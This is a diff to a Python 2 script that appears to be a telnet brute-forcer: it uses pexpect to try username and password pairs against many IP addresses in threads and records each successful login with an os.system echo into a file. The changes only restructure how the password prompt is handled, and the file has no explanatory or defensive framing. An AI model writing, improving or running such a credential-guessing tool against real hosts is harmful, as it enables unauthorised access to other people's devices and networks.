@@ -10,16 +10,19 @@ def telnet(ip,user,pwd):
             pass
         else:
             child.sendline (user)  
-            child.expect (['ass',pexpect.TIMEOUT,pexpect.EOF],timeout=5)
-            child.sendline(pwd)
-            index = child.expect (r'[>$~/]')
-    #print index
-    #print child.before
-            if index == 0:
-                print ip + ":" + user +":" + pwd + ":" "success"
-                os.system("echo %s >>aaa.txt " %(ip) )
-            else:
+            index=child.expect (['ass',pexpect.TIMEOUT,pexpect.EOF],timeout=5)
+            if index > 0:
                 pass
+            else:
+                child.sendline(pwd)
+                index = child.expect (r'[>$~/]')
+#print index
+#print child.before
+                if index == 0:
+                    print ip + ":" + user +":" + pwd + ":" "success"
+                    os.system("echo %s >>aaa.txt " %(ip) )
+                else:
+                    pass
     except:
         pass
     return 1;
@@ -66,3 +69,7 @@ if __name__ == "__main__":
         userpwd(ips,usertotal,pwdtotal)
         #print ips,usertotal,pwdtotal
         del hosttotal[:thread_number]
+
+        
+        
+
